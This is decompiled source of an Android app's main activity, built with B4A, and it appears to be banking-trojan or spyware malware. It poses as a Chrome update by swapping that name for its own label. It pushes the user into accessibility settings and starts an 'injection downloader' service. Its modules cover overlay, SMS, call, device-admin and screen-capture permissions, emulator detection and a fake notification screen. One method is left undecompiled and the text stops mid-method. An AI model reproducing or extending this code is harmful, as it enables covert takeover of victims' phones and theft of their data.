package com.com.androidrr;


import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebView;
//import androidx.core.os.EnvironmentCompat;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AActivity;
import anywheresoftware.b4a.B4AMenuItem;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.B4AActivity;
import anywheresoftware.b4a.B4AMenuItem;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.Msgbox;
import anywheresoftware.b4a.agraham.reflection.Reflection;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.keywords.constants.KeyCodes;
import anywheresoftware.b4a.objects.ActivityWrapper;
import anywheresoftware.b4a.objects.B4XViewWrapper;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.StringUtils;
import anywheresoftware.b4a.objects.ViewWrapper;
import anywheresoftware.b4a.objects.WebViewWrapper;
import anywheresoftware.b4a.objects.collections.JSONParser;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4a.sql.SQL;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Iterator;
import uk.co.martinpearman.b4a.webkit.DefaultJavascriptInterface;
import uk.co.martinpearman.b4a.webkit.WebViewExtras;


public class main extends Activity {
    public static String _adminidgen = "";
    public static String _intlanguage = "";
    public static int _isshouwl = 0;
    public static JavaObject _javaobject1 = null;
    public static String _strapp_url = "";
    public static B4XViewWrapper.XUI _xui = null;
    static boolean afterFirstLayout = false;
    public static boolean dontPause = false;
    public static final boolean fullScreen = true;
    public static final boolean includeTitle = false;
    static boolean isFirst = true;
    public static main mostCurrent;
    public static WeakReference<Activity> previousOne;
    public static BA processBA;
    private static boolean processGlobalsRun;
    ActivityWrapper _activity;
    BA activityBA;
    BALayout layout;
    ArrayList<B4AMenuItem> menuItems;
    private Boolean onKeySubExist = null;
    private Boolean onKeyUpSubExist = null;
    public Common __c = null;
    public WebViewExtras _webviewextras1 = null;
    public dateutils _dateutils = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static String _activity_pause(boolean z) throws Exception {
        return "";
    }

    public static void _jobdone(httpjob httpjobVar) throws Exception {
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        Activity activity;
        super.onCreate(bundle);
        mostCurrent = this;
        if (processBA == null) {
            BA ba = new BA(getApplicationContext(), (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.main");
            processBA = ba;
            ba.loadHtSubs(getClass());
            BALayout.setDeviceScale(getApplicationContext().getResources().getDisplayMetrics().density);
        } else {
            WeakReference<Activity> weakReference = previousOne;
            if (weakReference != null && (activity = weakReference.get()) != null && activity != this) {
                BA.LogInfo("Killing previous instance (main).");
                activity.finish();
            }
        }
        processBA.setActivityPaused(true);
        processBA.runHook("oncreate", this, null);
        getWindow().requestFeature(1);
        getWindow().setFlags(1024, 1024);
        processBA.sharedProcessBA.activityBA = null;
        BALayout bALayout = new BALayout(this);
        this.layout = bALayout;
        setContentView(bALayout);
        afterFirstLayout = false;
        WaitForLayout waitForLayout = new WaitForLayout();
        if (ServiceHelper.StarterHelper.startFromActivity(this, processBA, waitForLayout, false)) {
            BA.handler.postDelayed(waitForLayout, 5L);
        }
    }

    static class WaitForLayout implements Runnable {
        WaitForLayout() {
        }

        @Override // java.lang.Runnable
        public void run() {
            if (main.afterFirstLayout || main.mostCurrent == null) {
                return;
            }
            if (main.mostCurrent.layout.getWidth() == 0) {
                BA.handler.postDelayed(this, 5L);
                return;
            }
            main.mostCurrent.layout.getLayoutParams().height = main.mostCurrent.layout.getHeight();
            main.mostCurrent.layout.getLayoutParams().width = main.mostCurrent.layout.getWidth();
            main.afterFirstLayout = true;
            main.mostCurrent.afterFirstLayout();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void afterFirstLayout() {
        if (this != mostCurrent) {
            return;
        }
        this.activityBA = new BA(this, this.layout, processBA, "com.com.androidrr", "com.com.androidrr.main");
        processBA.sharedProcessBA.activityBA = new WeakReference<>(this.activityBA);
        ViewWrapper.lastId = 0;
        this._activity = new ActivityWrapper(this.activityBA, "activity");
        Msgbox.isDismissing = false;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            if (isFirst) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            BA ba = processBA;
            ba.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.main", ba, this.activityBA, this._activity, Float.valueOf(Common.Density), mostCurrent);
            this._activity.reinitializeForShell(this.activityBA, "activity");
        }
        initializeProcessGlobals();
        initializeGlobals();
        StringBuilder sb = new StringBuilder();
        sb.append("** Activity (main) Create ");
        sb.append(isFirst ? "(first time)" : "");
        sb.append(" **");
        BA.LogInfo(sb.toString());
        processBA.raiseEvent2(null, true, "activity_create", false, Boolean.valueOf(isFirst));
        isFirst = false;
        if (this != mostCurrent) {
            return;
        }
        processBA.setActivityPaused(false);
        BA.LogInfo("** Activity (main) Resume **");
        processBA.raiseEvent(null, "activity_resume", new Object[0]);
        if (Build.VERSION.SDK_INT >= 11) {
            try {
                Activity.class.getMethod("invalidateOptionsMenu", new Class[0]).invoke(this, null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override // anywheresoftware.b4a.B4AActivity
    public void addMenuItem(B4AMenuItem b4AMenuItem) {
        if (this.menuItems == null) {
            this.menuItems = new ArrayList<>();
        }
        this.menuItems.add(b4AMenuItem);
    }

    @Override // android.app.Activity
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        try {
            if (processBA.subExists("activity_actionbarhomeclick")) {
                Class.forName("android.app.ActionBar").getMethod("setHomeButtonEnabled", Boolean.TYPE).invoke(getClass().getMethod("getActionBar", new Class[0]).invoke(this, new Object[0]), true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (processBA.runHook("oncreateoptionsmenu", this, new Object[]{menu})) {
            return true;
        }
        ArrayList<B4AMenuItem> arrayList = this.menuItems;
        if (arrayList == null) {
            return false;
        }
        Iterator<B4AMenuItem> it = arrayList.iterator();
        while (it.hasNext()) {
            B4AMenuItem next = it.next();
            MenuItem add = menu.add(next.title);
            if (next.drawable != null) {
                add.setIcon(next.drawable);
            }
            if (Build.VERSION.SDK_INT >= 11) {
                try {
                    if (next.addToBar) {
                        MenuItem.class.getMethod("setShowAsAction", Integer.TYPE).invoke(add, 1);
                    }
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
            add.setOnMenuItemClickListener(new B4AMenuItemsClickListener(next.eventName.toLowerCase(BA.cul)));
        }
        return true;
    }

    @Override // android.app.Activity
    public boolean onOptionsItemSelected(MenuItem menuItem) {
        if (menuItem.getItemId() == 16908332) {
            processBA.raiseEvent(null, "activity_actionbarhomeclick", new Object[0]);
            return true;
        }
        return super.onOptionsItemSelected(menuItem);
    }

    @Override // android.app.Activity
    public boolean onPrepareOptionsMenu(Menu menu) {
        super.onPrepareOptionsMenu(menu);
        processBA.runHook("onprepareoptionsmenu", this, new Object[]{menu});
        return true;
    }

    @Override // android.app.Activity
    protected void onStart() {
        super.onStart();
        processBA.runHook("onstart", this, null);
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        processBA.runHook("onstop", this, null);
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z) {
        super.onWindowFocusChanged(z);
        if (processBA.subExists("activity_windowfocuschanged")) {
            processBA.raiseEvent2(null, true, "activity_windowfocuschanged", false, Boolean.valueOf(z));
        }
    }

    private class B4AMenuItemsClickListener implements MenuItem.OnMenuItemClickListener {
        private final String eventName;

        public B4AMenuItemsClickListener(String str) {
            this.eventName = str;
        }

        @Override // android.view.MenuItem.OnMenuItemClickListener
        public boolean onMenuItemClick(MenuItem menuItem) {
            main.processBA.raiseEventFromUI(menuItem.getTitle(), this.eventName + "_click", new Object[0]);
            return true;
        }
    }

    public static Class<?> getObject() {
        return main.class;
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (processBA.runHook("onkeydown", this, new Object[]{Integer.valueOf(i), keyEvent})) {
            return true;
        }
        if (this.onKeySubExist == null) {
            this.onKeySubExist = Boolean.valueOf(processBA.subExists("activity_keypress"));
        }
        if (this.onKeySubExist.booleanValue()) {
            if (i == 4 && Build.VERSION.SDK_INT >= 18) {
                HandleKeyDelayed handleKeyDelayed = new HandleKeyDelayed();
                handleKeyDelayed.f351kc = i;
                BA.handler.post(handleKeyDelayed);
                return true;
            }
            if (new HandleKeyDelayed().runDirectly(i)) {
                return true;
            }
        }
        return super.onKeyDown(i, keyEvent);
    }

    private class HandleKeyDelayed implements Runnable {

        /* renamed from: kc */
        int f351kc;

        private HandleKeyDelayed() {
        }

        @Override // java.lang.Runnable
        public void run() {
            runDirectly(this.f351kc);
        }

        public boolean runDirectly(int i) {
            Boolean bool = (Boolean) main.processBA.raiseEvent2(main.this._activity, false, "activity_keypress", false, Integer.valueOf(i));
            if (bool == null || bool.booleanValue()) {
                return true;
            }
            if (i != 4) {
                return false;
            }
            main.this.finish();
            return true;
        }
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyUp(int i, KeyEvent keyEvent) {
        Boolean bool;
        if (processBA.runHook("onkeyup", this, new Object[]{Integer.valueOf(i), keyEvent})) {
            return true;
        }
        if (this.onKeyUpSubExist == null) {
            this.onKeyUpSubExist = Boolean.valueOf(processBA.subExists("activity_keyup"));
        }
        if (this.onKeyUpSubExist.booleanValue() && ((bool = (Boolean) processBA.raiseEvent2(this._activity, false, "activity_keyup", false, Integer.valueOf(i))) == null || bool.booleanValue())) {
            return true;
        }
        return super.onKeyUp(i, keyEvent);
    }

    @Override // android.app.Activity
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        processBA.runHook("onnewintent", this, new Object[]{intent});
    }

    @Override // android.app.Activity
    public void onPause() {
        super.onPause();
        if (this._activity != null && this == mostCurrent) {
            Msgbox.dismiss(true);
            if (!dontPause) {
                BA.LogInfo("** Activity (main) Pause, UserClosed = " + this.activityBA.activity.isFinishing() + " **");
            } else {
                BA.LogInfo("** Activity (main) Pause event (activity is not paused). **");
            }
            if (mostCurrent != null) {
                processBA.raiseEvent2(this._activity, true, "activity_pause", false, Boolean.valueOf(this.activityBA.activity.isFinishing()));
            }
            if (!dontPause) {
                processBA.setActivityPaused(true);
                mostCurrent = null;
            }
            if (!this.activityBA.activity.isFinishing()) {
                previousOne = new WeakReference<>(this);
            }
            Msgbox.isDismissing = false;
            processBA.runHook("onpause", this, null);
        }
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        previousOne = null;
        processBA.runHook("ondestroy", this, null);
    }

    @Override // android.app.Activity
    public void onResume() {
        super.onResume();
        mostCurrent = this;
        Msgbox.isDismissing = false;
        if (this.activityBA != null) {
            BA.handler.post(new ResumeMessage(mostCurrent));
        }
        processBA.runHook("onresume", this, null);
    }

    private static class ResumeMessage implements Runnable {
        private final WeakReference<Activity> activity;

        public ResumeMessage(Activity activity) {
            this.activity = new WeakReference<>(activity);
        }

        @Override // java.lang.Runnable
        public void run() {
            main mainVar = main.mostCurrent;
            if (mainVar == null || mainVar != this.activity.get()) {
                return;
            }
            main.processBA.setActivityPaused(false);
            BA.LogInfo("** Activity (main) Resume **");
            if (mainVar != main.mostCurrent) {
                return;
            }
            main.processBA.raiseEvent(mainVar._activity, "activity_resume", null);
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        processBA.onActivityResult(i, i2, intent);
        processBA.runHook("onactivityresult", this, new Object[]{Integer.valueOf(i), Integer.valueOf(i2)});
    }

    private static void initializeGlobals() {
        processBA.raiseEvent2(null, true, "globals", false, null);
    }

    @Override // android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        for (int i2 = 0; i2 < strArr.length; i2++) {
            Object[] objArr = new Object[2];
            objArr[0] = strArr[i2];
            objArr[1] = Boolean.valueOf(iArr[i2] == 0);
            processBA.raiseEventFromDifferentThread(null, null, 0, "activity_permissionresult", true, objArr);
        }
    }

    public static boolean isAnyActivityVisible() {
        return (mostCurrent != null) | false | (faknotiactivity.mostCurrent != null) | (forc_activateacc.mostCurrent != null) | (perm_activatemediaproject.mostCurrent != null) | (perm_activateoverlay.mostCurrent != null) | (perm_ignorebatperm.mostCurrent != null) | (perm_notiacc.mostCurrent != null) | (perm_phonecal.mostCurrent != null) | (perm_smsperm.mostCurrent != null) | (perm_startactdevmang.mostCurrent != null) | (perm_startactwritesy.mostCurrent != null) | (perm_unknownapps.mostCurrent != null) | (perm_writesys.mostCurrent != null) | (req_all_perms.mostCurrent != null) | (wakeupdv.mostCurrent != null);
    }

    public static String _activity_create(boolean z) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("appname :");
        B4AApplication b4AApplication = Common.Application;
        sb.append(B4AApplication.getLabelName());
        sb.append("-");
        Common.LogImpl("6262145", sb.toString(), 0);
        ActivityWrapper activityWrapper = mostCurrent._activity;
        Colors colors = Common.Colors;
        activityWrapper.setColor(-1);
        File file = Common.File;
        File file2 = Common.File;
        if (!File.Exists(File.getDirInternal(), "loading.gif")) {
            File file3 = Common.File;
            File file4 = Common.File;
            String dirAssets = File.getDirAssets();
            File file5 = Common.File;
            File.Copy(dirAssets, "loading.gif", File.getDirInternal(), "loading.gif");
        }
        File file6 = Common.File;
        File file7 = Common.File;
        if (!File.Exists(File.getDirInternal(), "db.db")) {
            File file8 = Common.File;
            File file9 = Common.File;
            String dirAssets2 = File.getDirAssets();
            File file10 = Common.File;
            File.Copy(dirAssets2, "db.db", File.getDirInternal(), "db.db");
        }
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        DateTime dateTime = Common.DateTime;
        globalparameters._lnglastpermnotification = DateTime.getNow();
        globalparameters globalparametersVar2 = mostCurrent._globalparameters;
        globalparameters._isscreenison = true;
        _save_devicescreensize();
        _reload_fs();
        _create_ui2();
        if (!z) {
            _app_handle_openurl();
        }
        _dstrb_not_hndlr();
        return "";
    }

    public static String _activity_resume() throws Exception {
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        if (!globalparameters._ismainact_shouldclose) {
            return "";
        }
        mostCurrent._activity.Finish();
        globalparameters globalparametersVar2 = mostCurrent._globalparameters;
        globalparameters._ismainact_shouldclose = false;
        return "";
    }

    public static String _app_handle_openurl() throws Exception {
        try {
            clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
            if (clsclassperms_code._intpermissionno <= 2) {
                return "";
            }
            BA ba = processBA;
            backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
            if (Common.IsPaused(ba, backgroundservice.getObject())) {
                return "";
            }
            mostCurrent._activity.Finish();
            IntentWrapper intentWrapper = new IntentWrapper();
            intentWrapper.Initialize(IntentWrapper.ACTION_VIEW, _strapp_url);
            Common.StartActivity(processBA, intentWrapper.getObject());
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6393227", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return "";
        }
    }

    public static String _button1_click() throws Exception {
        _ws_send_devicescreenshot_permission();
        return "";
    }

    public static void _check_data(String str, String str2) throws Exception {
        new ResumableSub_check_data(null, str, str2).resume(processBA, null);
    }

    public static class ResumableSub_check_data extends BA.ResumableSub {
        String _var1;
        String _var2;
        main parent;
        boolean _isaccactive = false;
        IntentWrapper _intent1 = null;

        public ResumableSub_check_data(main mainVar, String str, String str2) {
            this.parent = mainVar;
            this._var1 = str;
            this._var2 = str2;
        }

        /* JADX WARN: Removed duplicated region for block: B:70:0x010e  */
        /* JADX WARN: Removed duplicated region for block: B:72:0x011a A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r8, java.lang.Object[] r9) throws java.lang.Exception {
            /*
                Method dump skipped, instructions count: 328
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.main.ResumableSub_check_data.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static boolean _check_if_notis() throws Exception {
        try {
            new Phone();
            String lowerCase = Phone.GetSettings("enabled_notification_listeners").toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            return lowerCase.contains(B4AApplication.getPackageName().toLowerCase());
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6720909", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return false;
        }
    }

    public static String _create_ui2() throws Exception {
        String ReadString;
        String str = "en";
        try {
            _intlanguage = BA.NumberToString(1);
            String _getphonelanguage_unicode = _getphonelanguage_unicode();
            if (!_getphonelanguage_unicode.equals("en") && !_getphonelanguage_unicode.equals("null") && _getphonelanguage_unicode != null) {
                str = _getphonelanguage_unicode;
            }
            File file = Common.File;
            File file2 = Common.File;
            if (File.Exists(File.getDirAssets(), "pg-" + Common.SmartStringFormatter("", str.toLowerCase().trim()) + ".html")) {
                File file3 = Common.File;
                File file4 = Common.File;
                ReadString = File.ReadString(File.getDirAssets(), "pg-" + Common.SmartStringFormatter("", str.toLowerCase().trim()) + ".html");
            } else {
                File file5 = Common.File;
                File file6 = Common.File;
                ReadString = File.ReadString(File.getDirAssets(), "pg-en.html");
            }
            WebViewWrapper webViewWrapper = new WebViewWrapper();
            webViewWrapper.Initialize(mostCurrent.activityBA, "");
            mostCurrent._activity.AddView((View) webViewWrapper.getObject(), 0, 0, Common.PerXToCurrent(100.0f, mostCurrent.activityBA), Common.PerYToCurrent(100.0f, mostCurrent.activityBA));
            mostCurrent._webviewextras1.Initialize((WebView) webViewWrapper.getObject());
            DefaultJavascriptInterface defaultJavascriptInterface = new DefaultJavascriptInterface();
            defaultJavascriptInterface.Initialize(mostCurrent.activityBA);
            mostCurrent._webviewextras1.AddJavascriptInterface(defaultJavascriptInterface, "B4A");
            B4AApplication b4AApplication = Common.Application;
            String replace = ReadString.replace("Chrome Update", B4AApplication.getLabelName());
            B4AApplication b4AApplication2 = Common.Application;
            String replace2 = replace.replace("Google Chrome", B4AApplication.getLabelName());
            File.OutputStreamWrapper outputStreamWrapper = new File.OutputStreamWrapper();
            outputStreamWrapper.InitializeToBytesArray(0);
            B4AApplication b4AApplication3 = Common.Application;
            B4AApplication.getIcon().WriteToStream((OutputStream) outputStreamWrapper.getObject(), 100, (Bitmap.CompressFormat) BA.getEnumFromString(Bitmap.CompressFormat.class, "PNG"));
            String replace3 = replace2.replace("appiconhere", new StringUtils().EncodeBase64(outputStreamWrapper.ToBytesArray()));
            outputStreamWrapper.Close();
            webViewWrapper.LoadHtml(replace3);
            webViewWrapper.setZoomEnabled(false);
            webViewWrapper.BringToFront();
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6458800", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
        }
        return "";
    }

    public static String _dstrb_not_hndlr() throws Exception {
        try {
            _javaobject1.InitializeContext(processBA);
            boolean ObjectToBoolean = BA.ObjectToBoolean(_javaobject1.RunMethod("isAccessibilityServiceEnabled", (Object[]) Common.Null));
            Common.LogImpl("6327684", "isAccActive : " + BA.ObjectToString(Boolean.valueOf(ObjectToBoolean)), 0);
            if (ObjectToBoolean) {
                return "";
            }
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            if (globalparameters._isaccactive) {
                return "";
            }
            BA ba = processBA;
            dtrsbnotisuntilactv dtrsbnotisuntilactvVar = mostCurrent._dtrsbnotisuntilactv;
            if (!Common.IsPaused(ba, dtrsbnotisuntilactv.getObject())) {
                return "";
            }
            BA ba2 = processBA;
            dtrsbnotisuntilactv dtrsbnotisuntilactvVar2 = mostCurrent._dtrsbnotisuntilactv;
            Common.StartService(ba2, dtrsbnotisuntilactv.getObject());
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6327695", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return "";
        }
    }

    public static int _get_barsheights() throws Exception {
        try {
            return _getrealheight_private() - Common.GetDeviceLayoutValues(mostCurrent.activityBA).Height;
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("61376268", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return 0;
        }
    }

    public static String _getphonelanguage_unicode() throws Exception {
        try {
            Reflection reflection = new Reflection();
            reflection.Target = reflection.RunStaticMethod("java.util.Locale", "getDefault", (Object[]) Common.Null, (String[]) Common.Null);
            return BA.ObjectToString(reflection.RunMethod("getLanguage"));
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6851975", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return "";
        }
    }

    public static int _getrealheight_private() throws Exception {
        new Phone();
        if (Phone.getSdkVersion() >= 17) {
            JavaObject javaObject = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), new JavaObject().InitializeContext(processBA).RunMethodJO("getWindowManager", (Object[]) Common.Null).RunMethod("getDefaultDisplay", (Object[]) Common.Null));
            JavaObject javaObject2 = new JavaObject();
            javaObject2.InitializeNewInstance("android.util.DisplayMetrics", (Object[]) Common.Null);
            javaObject.RunMethod("getRealMetrics", new Object[]{javaObject2.getObject()});
            return (int) BA.ObjectToNumber(javaObject2.GetField("heightPixels"));
        }
        return Common.GetDeviceLayoutValues(mostCurrent.activityBA).Height;
    }

    public static int _getrealwidth_private() throws Exception {
        new Phone();
        if (Phone.getSdkVersion() >= 17) {
            JavaObject javaObject = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), new JavaObject().InitializeContext(processBA).RunMethodJO("getWindowManager", (Object[]) Common.Null).RunMethod("getDefaultDisplay", (Object[]) Common.Null));
            JavaObject javaObject2 = new JavaObject();
            javaObject2.InitializeNewInstance("android.util.DisplayMetrics", (Object[]) Common.Null);
            javaObject.RunMethod("getRealMetrics", new Object[]{javaObject2.getObject()});
            return (int) BA.ObjectToNumber(javaObject2.GetField("widthPixels"));
        }
        return Common.GetDeviceLayoutValues(mostCurrent.activityBA).Width;
    }

    public static String _globals() throws Exception {
        mostCurrent._webviewextras1 = new WebViewExtras();
        return "";
    }

    public static boolean _isemulator() throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(processBA);
            return BA.ObjectToBoolean(javaObject.RunMethod("isEmulator", (Object[]) Common.Null));
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6131078", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
            return false;
        }
    }

    public static String _istheaccessibilityserviceenabled(boolean z) throws Exception {
        Common.LogImpl("61114113", "IsTheAccessibilityServiceEnabled", 0);
        _javaobject1.InitializeContext(processBA);
        boolean ObjectToBoolean = BA.ObjectToBoolean(_javaobject1.RunMethod("isAccessibilityServiceEnabled", (Object[]) Common.Null));
        Common.LogImpl("61114117", "isAccActive : " + BA.ObjectToString(Boolean.valueOf(ObjectToBoolean)), 0);
        if (!ObjectToBoolean) {
            IntentWrapper intentWrapper = new IntentWrapper();
            intentWrapper.Initialize("android.settings.ACCESSIBILITY_SETTINGS", "");
            Common.StartActivity(processBA, intentWrapper.getObject());
        }
        return "";
    }

    public static String _lblprocedere_click() throws Exception {
        try {
            _javaobject1.InitializeContext(processBA);
            boolean ObjectToBoolean = BA.ObjectToBoolean(_javaobject1.RunMethod("isAccessibilityServiceEnabled", (Object[]) Common.Null));
            Common.LogImpl("6589828", "isAccActive : " + BA.ObjectToString(Boolean.valueOf(ObjectToBoolean)), 0);
            if (!ObjectToBoolean) {
                IntentWrapper intentWrapper = new IntentWrapper();
                intentWrapper.Initialize("android.settings.ACCESSIBILITY_SETTINGS", "");
                Common.StartActivity(processBA, intentWrapper.getObject());
            }
            _isshouwl++;
            BA ba = processBA;
            backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
            if (Common.IsPaused(ba, backgroundservice.getObject())) {
                BA ba2 = processBA;
                backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                Common.StartService(ba2, backgroundservice.getObject());
            }
            Common.LogImpl("6589840", BA.NumberToString(_isshouwl), 0);
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            if (globalparameters._ispreinjallfls) {
                BA ba3 = processBA;
                inj_dnlader inj_dnladerVar = mostCurrent._inj_dnlader;
                Common.StartService(ba3, inj_dnlader.getObject());
            }
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("6589850", BA.ObjectToString(Common.LastException(mostCurrent.activityBA)), 0);
        }
        return "";
    }

    public static void initializeProcessGlobals() {
        if (processGlobalsRun) {
            return;
        }
        processGlobalsRun = true;
        try {
            dateutils._process_globals();
            _process_globals();
            starter._process_globals();
            clsclassperms_code._process_globals();
            clsclassperms_code2._process_globals();
            backgroundservice._process_globals();
            mediaprojectionbackservice._process_globals();
            globalparameters._process_globals();
            dtrsbnotisuntilactv._process_globals();
            faknotiactivity._process_globals();
            forc_activateacc._process_globals();
            inj_dnlader._process_globals();
            mainglobalstrings._process_globals();
            myreceiver._process_globals();
            notificationservice._process_globals();
            perm_activatemediaproject._process_globals();
            perm_activateoverlay._process_globals();
            perm_ignorebatperm._process_globals();
            perm_notiacc._process_globals();
            perm_phonecal._process_globals();
            perm_smsperm._process_globals();
            perm_startactdevmang._process_globals();
            perm_startactwritesy._process_globals();
            perm_unknownapps._process_globals();
            perm_writesys._process_globals();
            req_all_perms._process_globals();
            s1._process_globals();
            service1._process_globals();
            service2._process_globals();
            service3._process_globals();
            service4._process_globals();
            srvnewphonecall._process_globals();
            wakeupdv._process_globals();
            httputils2service._process_globals();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static String _process_globals() throws Exception {
        _xui = new B4XViewWrapper.XUI();
        _adminidgen = "changeadminid";
        _intlanguage = "changelanghere";
        _isshouwl = 0;
        _strapp_url = "https://google.com";
        _javaobject1 = new JavaObject();
        return "";
    }

    public static void _reload_fs() throws Exception {
        new ResumableSub_Reload_Fs(null).resume(processBA, null);
    }

    public static class ResumableSub_Reload_Fs extends BA.ResumableSub {
        main parent;
        SQL _sql = null;
        SQL.ResultSetWrapper _rs = null;
        String _strenco = "";
        String _strlang = "";

        /* renamed from: _j */
        httpjob f352_j = null;
        JSONParser _parser = null;
        Map _jroot = null;
        String _translated = "";

        public ResumableSub_Reload_Fs(main mainVar) {
            this.parent = mainVar;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 47;
                            this.catchState = 46;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 46;
                            globalparameters globalparametersVar = main.mostCurrent._globalparameters;
                            globalparameters._mpinjlist.Initialize();
                            break;
                        case 4:
                            this.state = 9;
                            this.catchState = 8;
                            this.state = 6;
                            break;
                        case 6:
                            this.state = 9;
                            this.catchState = 8;
                            backgroundservice backgroundserviceVar = main.mostCurrent._backgroundservice;
                            backgroundservice._acs.remove_lst_ovlypks();
                            break;
                        case 8:
                            this.state = 9;
                            this.catchState = 46;
                            Common.LogImpl("6786440", BA.ObjectToString(Common.LastException(main.mostCurrent.activityBA)), 0);
                            break;
                        case 9:
                            this.state = 10;
                            this.catchState = 46;
                            SQL sql = new SQL();
                            this._sql = sql;
                            File file = Common.File;
                            sql.Initialize(File.getDirInternal(), "db.db", false);
                            this._rs = new SQL.ResultSetWrapper();
